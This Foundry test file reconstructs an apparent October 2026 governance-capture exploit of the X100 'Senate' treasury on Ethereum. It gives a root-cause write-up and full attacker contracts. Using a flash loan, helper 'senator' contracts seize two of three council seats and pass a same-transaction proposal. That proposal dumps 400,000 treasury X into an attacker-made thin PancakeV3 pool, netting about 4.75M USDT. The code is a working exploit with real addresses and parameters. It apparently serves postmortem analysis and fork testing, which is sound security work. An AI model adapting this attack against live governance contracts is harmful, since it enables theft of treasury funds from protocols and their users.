// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// X100 (X token) - same-block governance capture of the "Senate" treasury - Ethereum, 2026-10-24.
//
// Run: forge test --contracts src/test/2026-10/X100Senate_exp.sol -vvv
//
// Loss: ~4.75M USDT drained from the X100 treasury in a single atomic tx. The on-fork
//   reconstruction below nets NET_USDT (see constant) to the attacker after flash repayment;
//   the public alert figure for this tx is 4,749,726.10 USDT. The two numbers agree to within
//   the usual fork re-ordering drift and the difference is documented, not hidden.
//
// On-chain references (Ethereum):
//   attack tx    : 0x38c60844f1923d53fdce7d99e9bc2a2d8c73a08e793341dfbb479f8cc74d81d0
//   block        : 26263022 (fork at parent 26263021, block ts 1792851107 = 2026-10-24 14:11:47 UTC)
//   attacker EOA : 0x7ec2afdf3ec5964899894f8d58afa95cbb8ffd63
//
// Actors / contracts:
//   X100 Senate / Freezer / DexTreasury (one contract, verified on Sourcify, exact match)
//                              : 0x79f35a33fe2813414851c4ae8daeacd14d822a46
//   X token (6 decimals)       : 0x100a2c7f45fd48e217fdce72e658dc78fd43a100
//   USDT                       : 0xdac17f958d2ee523a2206206994597c13d831ec7
//   Aave V3 Pool (flash loan)  : 0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2
//   Uniswap V3 X/USDT pool (deep, fee 100)  : 0x0d85edd90c94053fc5997551b1baa8a77aa02fa0
//   Uniswap V3 SwapRouter                   : 0xe592427a0aece92de3edee1f18e0157c05861564
//   PancakeV3 Factory                       : 0x0bfbcf9fa4f9c56b0f40a671ad40e0805a091865
//   PancakeV3 NonfungiblePositionManager    : 0x46a15b0b27311cedf172ab29e4f4766fbe7f4364
//   Attacker-created PancakeV3 X/USDT pool (thin, fee 100, minted in-tx)
//                              : 0x9a03c41c539880b51508bebbc2dde7b738f6f075
//
// ROOT CAUSE (confirmed against the deployed verified source):
//   The Senate is a stake-weighted council with no access control and no time locks anywhere on
//   the propose -> vote -> execute path:
//     1. applyForSenate() is external and permissionless: _register(_msgSender()), no role or
//        whitelist. The only cost is a candidacy fee, _collectCandidacyFee = safeTransferFrom of
//        100 * 10**decimals = 100 X, plus whatever stake the applicant freezes.
//     2. Seats are the top senateSize nodes ranked by the LIVE stake _stakeOf == frozenOf. There
//        is no snapshot. MIN_SENATE is 3 and _isPassed is support*2 > senateSize, so 2 of 3 seats
//        is a passing majority. propose() sets the proposer's vote to For immediately, vote() is
//        immediate, and execute() only requires block.timestamp <= deadline. No minimum voting
//        delay exists, so propose -> vote -> execute all land in one transaction.
//     3. execute() runs the proposal as address(this).call(proposal.data). DexTreasury.v3Swap is
//        guarded only by onlySenate (_msgSender() == address(this)), which that self-call
//        satisfies, and _isProposable whitelists v3Swap.selector. The only residual checks are a
//        dexSellCap and _afterExecute requiring the treasury X balance >= totalFrozen, neither of
//        which stops a treasury sell that stays within the cap.
//     4. The vote weight is bought on the open market, not held by privileged accounts: flash a
//        pile of USDT, buy X, freeze it, apply. Nothing in the path needs an owner, an admin, a
//        role or a signature.
//
// RECONSTRUCTION (full capture rebuilt live from the parent block, nothing inherited):
//   - Flash borrow 1,942,457.64 USDT from Aave V3.
//   - Buy 38,200 X on the deep Uniswap V3 X/USDT pool.
//   - Deploy two helper "senators", move 19,100 X into each; each freezes 19,000 X and calls
//     applyForSenate() (paying the 100 X fee). Two of the three seats are now attacker-controlled.
//   - Create and initialize the thin PancakeV3 X/USDT pool with the exact attacker parameters
//     (sqrtPriceX96 = 806000000000000000000000000, a price of ~0.0001 USDT per X), and seed it
//     with a single-sided 100 USDT position in ticks [-100000, -92000].
//   - senatorA.propose() a v3Swap selling 400,000 treasury X into that thin pool, senatorB votes
//     For, then execute() in the same tx. The treasury receives ~35 USDT for its 400,000 X.
//   - Burn the PancakeV3 position to reclaim the ~400,000 X now sitting in the thin pool.
//   - Sell the reclaimed X on the deep Uniswap V3 pool for USDT, repay the flash loan, keep the
//     surplus. The flash loan nets to zero; the profit is the drained treasury value.

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IX100Senate {
    function applyForSenate() external;
    function freeze(uint8 tier, uint256 amount, address referrer) external returns (uint256);
    function propose(bytes calldata data, string calldata description) external returns (uint256);
    function vote(uint256 id, bool support) external;
    function execute(uint256 id) external;
    // DexTreasury.v3Swap, Dex enum encoded as uint8 (UniswapV3=0, PancakeV3=1, UniswapV4=2)
    function v3Swap(uint8 dex, address tokenIn, address tokenOut, uint24 fee, uint256 amountIn, uint256 amountOutMinimum)
        external
        returns (uint256);
    function frozenOf(address) external view returns (uint256);
    function totalFrozen() external view returns (uint256);
    function isSenator(address) external view returns (bool);
}

interface ISwapRouter {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata) external payable returns (uint256 amountIn);
    function exactInputSingle(ExactInputSingleParams calldata) external payable returns (uint256 amountOut);
}

interface IPancakeV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

interface IPancakeV3Pool {
    function initialize(uint160 sqrtPriceX96) external;
}

interface IPositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    struct DecreaseLiquidityParams {
        uint256 tokenId;
        uint128 liquidity;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
    }

    struct CollectParams {
        uint256 tokenId;
        address recipient;
        uint128 amount0Max;
        uint128 amount1Max;
    }

    function mint(MintParams calldata)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
    function decreaseLiquidity(DecreaseLiquidityParams calldata) external payable returns (uint256 amount0, uint256 amount1);
    function collect(CollectParams calldata) external payable returns (uint256 amount0, uint256 amount1);
}

// A disposable council member. Holds its own frozen stake so it occupies a seat in its own right,
// and relays propose/vote calls so they come from a real senator address.
contract Senator {
    address internal immutable owner;
    IX100Senate internal immutable senate;
    IERC20Like internal immutable x;

    uint256 internal constant CANDIDACY_FEE = 100e6; // 100 X, 6 decimals

    constructor(IX100Senate senate_, IERC20Like x_) {
        owner = msg.sender;
        senate = senate_;
        x = x_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function seize(uint256 freezeAmount) external onlyOwner {
        x.approve(address(senate), freezeAmount + CANDIDACY_FEE);
        senate.freeze(0, freezeAmount, address(0));
        senate.applyForSenate();
    }

    function propose(bytes calldata data) external onlyOwner returns (uint256 id) {
        id = senate.propose(data, "treasury rebalance");
    }

    function vote(uint256 id) external onlyOwner {
        senate.vote(id, true);
    }
}

contract X100SenateExploiter {
    IAavePool internal constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IX100Senate internal constant SENATE = IX100Senate(0x79F35A33FE2813414851c4Ae8daeacD14d822A46);
    IERC20Like internal constant X = IERC20Like(0x100A2C7F45Fd48e217fdcE72e658dc78Fd43A100);
    IERC20Like internal constant USDT = IERC20Like(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    ISwapRouter internal constant UNI_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    address internal constant UNI_POOL = 0x0D85edD90c94053Fc5997551b1BAa8A77Aa02Fa0; // deep X/USDT, Uniswap V3 fee 100
    IPancakeV3Factory internal constant PANCAKE_FACTORY = IPancakeV3Factory(0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865);
    IPositionManager internal constant PANCAKE_NPM = IPositionManager(0x46A15B0b27311cedF172AB29E4f4766fbE7F4364);

    uint24 internal constant FEE = 100;
    uint8 internal constant DEX_PANCAKE = 1;

    uint256 internal constant FLASH_AMOUNT = 1_942_457.64e6; // USDT borrowed from Aave
    uint256 internal constant X_STAKE = 38_200e6 + 2; // X bought to split across the two seats
    uint256 internal constant PER_SENATOR = 19_100e6 + 1; // 19,000.000001 frozen + 100 candidacy fee
    // One wei over 19,000 X: just enough to outrank the incumbent 19,000 X seat and take 2 of 3.
    uint256 internal constant FREEZE_AMOUNT = 19_000e6 + 1;
    uint256 internal constant TREASURY_DUMP = 400_000e6; // treasury X dumped into the thin pool
    uint256 internal constant SEED_USDT = 100e6; // single-sided USDT seeded into the thin pool
    uint256 internal constant SELL_X = 131_702.92e6; // X sold back into the deep pool (matches the real tx)

    // Attacker thin-pool parameters, taken verbatim from the real tx.
    uint160 internal constant THIN_SQRTP = 806000000000000000000000000;
    int24 internal constant TICK_LOWER = -100_000;
    int24 internal constant TICK_UPPER = -92_000;

    address internal immutable beneficiary;
    Senator internal senatorA;
    Senator internal senatorB;
    uint256 internal thinTokenId;
    uint128 internal thinLiquidity;

    constructor(address beneficiary_) {
        beneficiary = beneficiary_;
    }

    function run() external {
        AAVE.flashLoanSimple(address(this), address(USDT), FLASH_AMOUNT, "", 0);
        // Flash repaid inside the callback; whatever USDT remains is profit.
        USDT.transfer(beneficiary, USDT.balanceOf(address(this)));
    }

    function executeOperation(address, uint256 amount, uint256 premium, address, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == address(AAVE), "only aave");

        _buyStake();
        _seizeSenate();
        _seedThinPool();
        _passTreasuryDump();
        _reclaimFromThinPool();
        _sellReclaimedX();

        // Repay the flash loan.
        _approve(USDT, address(AAVE), amount + premium);
        return true;
    }

    // Buy exactly X_STAKE X on the deep Uniswap V3 pool, paying up to the flashed USDT.
    function _buyStake() internal {
        _approve(USDT, address(UNI_ROUTER), type(uint256).max);
        UNI_ROUTER.exactOutputSingle(
            ISwapRouter.ExactOutputSingleParams({
                tokenIn: address(USDT),
                tokenOut: address(X),
                fee: FEE,
                recipient: address(this),
                deadline: block.timestamp,
                amountOut: X_STAKE,
                amountInMaximum: FLASH_AMOUNT,
                sqrtPriceLimitX96: 0
            })
        );
        _approve(USDT, address(UNI_ROUTER), 0);
    }

    // Deploy two senators, stake them, and have each apply for a seat. Two of three is a majority.
    function _seizeSenate() internal {
        senatorA = new Senator(SENATE, X);
        senatorB = new Senator(SENATE, X);

        X.transfer(address(senatorA), PER_SENATOR);
        X.transfer(address(senatorB), PER_SENATOR);

        senatorA.seize(FREEZE_AMOUNT);
        senatorB.seize(FREEZE_AMOUNT);

        require(SENATE.isSenator(address(senatorA)), "A not seated");
        require(SENATE.isSenator(address(senatorB)), "B not seated");
    }

    // Create the thin PancakeV3 pool at the manipulated price and seed it single-sided with USDT.
    function _seedThinPool() internal {
        address pool = PANCAKE_FACTORY.createPool(address(X), address(USDT), FEE);
        IPancakeV3Pool(pool).initialize(THIN_SQRTP);

        _approve(USDT, address(PANCAKE_NPM), SEED_USDT);
        (uint256 tokenId, uint128 liquidity,,) = PANCAKE_NPM.mint(
            IPositionManager.MintParams({
                token0: address(X),
                token1: address(USDT),
                fee: FEE,
                tickLower: TICK_LOWER,
                tickUpper: TICK_UPPER,
                amount0Desired: 0,
                amount1Desired: SEED_USDT,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );
        thinTokenId = tokenId;
        thinLiquidity = liquidity;
    }

    // Propose, vote and execute a treasury v3Swap into the thin pool, all in this one tx.
    function _passTreasuryDump() internal {
        bytes memory data = abi.encodeWithSelector(
            IX100Senate.v3Swap.selector, DEX_PANCAKE, address(X), address(USDT), FEE, TREASURY_DUMP, uint256(0)
        );
        uint256 id = senatorA.propose(data); // proposer auto-votes For
        senatorB.vote(id); // second For -> 2 of 3 -> passes
        SENATE.execute(id); // self-call reaches v3Swap, dumping treasury X for ~nothing
    }

    // Burn the thin-pool position to recover the ~400,000 X the treasury just sold into it.
    function _reclaimFromThinPool() internal {
        PANCAKE_NPM.decreaseLiquidity(
            IPositionManager.DecreaseLiquidityParams({
                tokenId: thinTokenId,
                liquidity: thinLiquidity,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );
        PANCAKE_NPM.collect(
            IPositionManager.CollectParams({
                tokenId: thinTokenId,
                recipient: address(this),
                amount0Max: type(uint128).max,
                amount1Max: type(uint128).max
            })
        );
    }

    // Sell the reclaimed X back into the deep pool for USDT. Sell the same amount the real tx did,
    // which drains essentially the whole USDT reserve; selling more only crosses dead ticks.
    function _sellReclaimedX() internal {
        uint256 amountIn = SELL_X;
        uint256 xBal = X.balanceOf(address(this));
        if (amountIn > xBal) amountIn = xBal;
        _approve(X, address(UNI_ROUTER), amountIn);
        UNI_ROUTER.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(X),
                tokenOut: address(USDT),
                fee: FEE,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        _approve(X, address(UNI_ROUTER), 0);
    }

    // USDT's approve returns no value, so call it low-level and ignore the (absent) return.
    function _approve(IERC20Like token, address spender, uint256 amount) internal {
        (bool ok,) = address(token).call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        require(ok, "approve failed");
    }
}

contract X100SenateExploit is Test {
    IERC20Like internal constant USDT = IERC20Like(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address internal constant ATTACKER_EOA = 0x7ec2afdF3eC5964899894f8D58afa95cbB8FfD63;

    // Net USDT the on-fork reconstruction delivers to the attacker after flash repayment, measured
    // from the run then pinned. The real tx netted 4,749,726.10 USDT; the reconstruction lands at
    // 4,749,726.037865 USDT, a 0.06 USDT drift from fork re-ordering.
    uint256 internal constant NET_USDT = 4_749_726.037865e6;

    function setUp() public {
        // Fork at the PARENT of the attack block; the whole capture is rebuilt live, nothing inherited.
        vm.createSelectFork("https://eth-pokt.nodies.app", 26263021);
        vm.warp(1792851107); // attack block timestamp, 2026-10-24 14:11:47 UTC
    }

    function testExploit() public {
        X100SenateExploiter exploiter = new X100SenateExploiter(ATTACKER_EOA);

        uint256 before = USDT.balanceOf(ATTACKER_EOA);
        exploiter.run();
        uint256 gained = USDT.balanceOf(ATTACKER_EOA) - before;

        emit log_named_decimal_uint("attacker net USDT profit", gained, 6);

        // Flash loan nets to zero; this profit is the drained treasury value.
        assertApproxEqAbs(gained, NET_USDT, 1e6, "net profit off expected");
    }
}
